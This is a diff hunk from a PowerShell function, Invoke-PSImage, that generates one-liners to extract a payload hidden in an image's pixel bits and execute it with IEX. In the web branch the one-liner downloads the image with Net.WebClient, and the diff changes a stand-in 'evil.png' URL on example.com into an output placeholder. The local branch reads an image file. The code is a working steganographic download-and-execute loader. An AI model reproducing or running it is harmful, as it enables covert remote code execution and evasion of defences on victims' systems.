@@ -97,7 +97,7 @@ function Invoke-PSImage {
 	$lpayload = ($payload.Length - 2)
 
 	if ($web) {
-		$pscmd = "sal a New-Object;Add-Type -AssemblyName `"System.Drawing`";`$g= a System.Drawing.Bitmap((a Net.WebClient).OpenRead(`"http://example.com/evil.png`"));`$o= a Byte[] $array;(0..$lrows)|% {foreach(`$x in (0..$lwidth)){`$p=`$g.GetPixel(`$x,`$_);`$o[`$_*$width+`$x]=([math]::Floor((`$p.B -band 15)*16) -bor (`$p.G -band 15))}};IEX([System.Text.Encoding]::ASCII.GetString(`$o[0..$lpayload]))"
+		$pscmd = "sal a New-Object;Add-Type -AssemblyName `"System.Drawing`";`$g= a System.Drawing.Bitmap((a Net.WebClient).OpenRead(`"[OUTPUT]`"));`$o= a Byte[] $array;(0..$lrows)|% {foreach(`$x in (0..$lwidth)){`$p=`$g.GetPixel(`$x,`$_);`$o[`$_*$width+`$x]=([math]::Floor((`$p.B -band 15)*16) -bor (`$p.G -band 15))}};IEX([System.Text.Encoding]::ASCII.GetString(`$o[0..$lpayload]))"
 	}
 	else {
 		$pscmd = "sal a New-Object;Add-Type -AssemblyName `"System.Drawing`";`$g= a System.Drawing.Bitmap(`"$Out`");`$o= a Byte[] $array;(0..$lrows)|% {foreach(`$x in (0..$lwidth)){`$p=`$g.GetPixel(`$x,`$_);`$o[`$_*$width+`$x]=([math]::Floor((`$p.B -band 15)*16) -bor (`$p.G -band 15))}};`$g.Dispose();IEX([System.Text.Encoding]::ASCII.GetString(`$o[0..$lpayload]))"
